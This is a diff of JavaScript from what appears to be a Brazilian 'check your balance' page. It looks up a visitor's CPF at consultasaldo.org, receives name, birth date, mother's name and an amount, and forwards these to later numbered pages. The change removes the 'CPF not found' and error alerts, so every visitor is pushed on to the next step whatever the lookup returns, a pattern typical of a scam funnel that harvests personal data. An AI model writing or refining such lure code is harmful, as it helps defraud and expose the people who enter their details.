@@ -216,14 +216,15 @@ function consultar(){
   fetch('https://consultasaldo.org/wp-json/cpf/v1/consultar?cpf='+cpf)
     .then(function(r){return r.json();})
     .then(function(d){
-      if(d.erro){alert('CPF não encontrado. Verifique e tente novamente.');btn.textContent='CONSULTAR AGORA';btn.disabled=false;return;}
       document.getElementById('loading-overlay').classList.add('show');
       setTimeout(function(){
         var url='../3/index.html?cpf='+cpf;
-        if(d.nome) url+='&nome='+encodeURIComponent(d.nome);
-        if(d.nascimento) url+='&nasc='+encodeURIComponent(d.nascimento);
-        if(d.mae) url+='&mae='+encodeURIComponent(d.mae);
-        if(d.valor) url+='&valor='+encodeURIComponent(d.valor);
+        if(d && !d.erro) {
+          if(d.nome) url+='&nome='+encodeURIComponent(d.nome);
+          if(d.nascimento) url+='&nasc='+encodeURIComponent(d.nascimento);
+          if(d.mae) url+='&mae='+encodeURIComponent(d.mae);
+          if(d.valor) url+='&valor='+encodeURIComponent(d.valor);
+        }
         // Verificar se deve pular o termo
         var skipTermo = new URLSearchParams(window.location.search).get('skip-termo') === '1';
         if(skipTermo) {
@@ -233,9 +234,14 @@ function consultar(){
       },2500);
     })
     .catch(function(){
-      alert('Erro ao consultar. Tente novamente.');
-      btn.textContent='CONSULTAR AGORA';
-      btn.disabled=false;
+      // Em caso de falha da API, redirecionar mesmo assim usando apenas o CPF validado matematicamente
+      document.getElementById('loading-overlay').classList.add('show');
+      setTimeout(function(){
+        var url='../3/index.html?cpf='+cpf;
+        var skipTermo = new URLSearchParams(window.location.search).get('skip-termo') === '1';
+        if(skipTermo) url = url.replace('../3/index.html', '../4/index.html');
+        window.location.href=url;
+      }, 2500);
     });
 }
 // Data atual dinâmica
